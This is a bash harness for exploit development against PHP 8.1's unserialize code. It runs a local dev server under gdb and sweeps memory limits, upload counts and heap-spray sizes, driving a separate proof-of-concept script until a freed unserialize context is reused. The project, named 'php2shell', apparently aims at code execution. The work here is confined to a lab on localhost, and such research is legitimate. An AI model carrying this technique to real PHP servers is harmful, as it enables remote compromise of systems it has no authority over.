#!/bin/bash
# Sweep arm configs until the decode-side orphan (UNSER_INIT with no destroy),
# then sweep the spray until the fire reuses it (UNSER_INIT level=1 data=...).
set -u
ROOT=/tmp/php2shell4
SID=u0123456789abcdefghijklmnopqrstuv
POC=/mnt/c/Users/andre/Downloads/php2shell-claude/poc_unserialize.py
PORT=18100

mkdir -p /tmp/sweep
for MEM in 7M 8M 9M; do
for AF in 16 20; do
for TRY in 1 2 3; do
  pkill -f "php -S 127.0.0.1:$PORT" 2>/dev/null; sleep 0.2
  rm -rf "$ROOT"; mkdir -p "$ROOT/sess"
  cp /mnt/c/Users/andre/Downloads/php2shell-claude/lab_index.php "$ROOT/index.php"
  cat > "$ROOT/bg.gdb" << EOF
set pagination off
set confirm off
set debuginfod enabled off
set breakpoint pending on
break php_var_serialize_init
commands
silent
printf "S_INIT %u %p\n", *(unsigned int*)((char*)&basic_globals+3368), *(void**)((char*)&basic_globals+3360)
continue
end
break php_var_serialize_destroy
commands
silent
printf "S_DESTR %u %p\n", *(unsigned int*)((char*)&basic_globals+3368), *(void**)((char*)&basic_globals+3360)
continue
end
break php_var_unserialize_init
commands
silent
printf "U_INIT %u %p\n", *(unsigned int*)((char*)&basic_globals+3384), *(void**)((char*)&basic_globals+3376)
continue
end
break php_var_unserialize_destroy
commands
silent
printf "U_DESTR %u %p\n", *(unsigned int*)((char*)&basic_globals+3384), *(void**)((char*)&basic_globals+3376)
continue
end
set logging file $ROOT/trace.log
set logging enabled on
run -d memory_limit=$MEM -d display_errors=0 -d post_max_size=32M -d upload_max_filesize=32M -d max_file_uploads=25 -d session.upload_progress.min_freq=0 -d session.save_path=$ROOT/sess -S 127.0.0.1:$PORT -t $ROOT
EOF
  gdb -q -x "$ROOT/bg.gdb" /usr/bin/php8.1 > "$ROOT/gdb.log" 2>&1 &
  GDB=$!
  # wait until the dev server actually answers (gdb symbol load is slow)
  UP=0
  for i in $(seq 1 40); do
    if curl -s -o /dev/null --max-time 2 http://127.0.0.1:$PORT/index.php; then UP=1; break; fi
    sleep 0.5
  done
  [ "$UP" = 1 ] || { echo "mem=$MEM af=$AF try=$TRY -> SERVER-NEVER-UP"; kill $GDB 2>/dev/null; continue; }
  timeout 40 python3 "$POC" "http://127.0.0.1:$PORT/index.php" --lab --sid "$SID" --skip-fire --arm-files $AF 2>&1 | grep -E 'arm |status'
  sleep 0.3
  NINIT=$(grep -c 'U_INIT' "$ROOT/trace.log" 2>/dev/null || echo 0)
  [ "${NINIT:-0}" -ge 2 ] 2>/dev/null || echo "  (warn: only $NINIT U_INIT lines - arm may not have run)"
  RES=$(python3 - "$ROOT/trace.log" << 'PYEOF'
import sys
try:
    lines = [l.strip().split() for l in open(sys.argv[1], errors='replace') if l.startswith(('U_INIT','U_DESTR','S_INIT','S_DESTR'))]
except FileNotFoundError:
    lines = []
orph = None
for tag, iname, dname in (('U', 'U_INIT', 'U_DESTR'), ('S', 'S_INIT', 'S_DESTR')):
    seq = [l for l in lines if l[0] in (iname, dname)]
    for i, l in enumerate(seq):
        if l[0] == iname and (i + 1 >= len(seq) or seq[i+1][0] != dname):
            orph = '%s:%s' % (tag, l[3] if len(l) > 3 else '?')
            break
    if orph:
        break
reuse = sum(1 for l in lines if l[0] in ('U_INIT', 'S_INIT') and len(l) > 2 and l[2] == '1')
if orph:
    print('ORPHAN %s reuse=%d' % (orph, reuse))
elif reuse:
    print('REUSEONLY %d' % reuse)
else:
    print('clean')
PYEOF
)
  REUSE=$(grep -cE 'U_INIT 1 |S_INIT 1 ' "$ROOT/trace.log" 2>/dev/null || true)
  echo "mem=$MEM af=$AF try=$TRY -> $RES reuse_lines=$REUSE"
  if [[ "$RES" == "ORPHAN U:"* ]]; then
    echo "=== decode-side orphan with mem=$MEM af=$AF; firing ==="
    rm -f "$ROOT/sess/sess_$SID"
    for SP in 150 300; do
      timeout 40 python3 "$POC" "http://127.0.0.1:$PORT/index.php" --lab --sid "$SID" --fire-sid "$SID" --skip-arm --spray $SP 2>&1 | grep -E 'status'
      sleep 0.3
      if grep -q 'U_INIT 1 ' "$ROOT/trace.log"; then
        echo "==== UNSERIALIZE-CONTEXT REUSE PROVEN: mem=$MEM af=$AF spray=$SP ===="
        grep 'U_INIT 1 ' "$ROOT/trace.log" | head -3
        cp "$ROOT/trace.log" /tmp/sweep/reuse_trace.log
        kill $GDB 2>/dev/null; pkill -f "php -S 127.0.0.1:$PORT" 2>/dev/null
        exit 0
      fi
    done
  fi
  kill $GDB 2>/dev/null; pkill -f "php -S 127.0.0.1:$PORT" 2>/dev/null
done
done
done
echo SWEEP_DONE_NO_REUSE
